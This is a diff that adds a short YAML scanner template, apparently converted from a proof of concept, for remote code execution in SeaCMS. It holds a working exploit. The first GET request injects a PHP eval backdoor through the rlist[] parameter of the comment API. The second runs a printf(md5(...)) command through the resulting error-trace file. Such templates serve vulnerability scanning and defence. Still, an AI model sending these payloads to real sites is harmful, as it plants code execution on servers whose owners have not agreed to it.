@@ -1,0 +1,25 @@
+id: yaml-poc-seacms-seacms-rce-CT-158384
+info:
+  name: Yaml Poc Seacms Seacms Rce Ct 158384
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-seacms-seacms-rce-CT-158384'
+  tags: rce
+  reference: []
+http:
+- method: GET
+  path:
+  - /comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[_])%3B%3F%3E
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /data/mysqli_error_trace.php?_=printf(md5("{{r1}}"))%3B
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
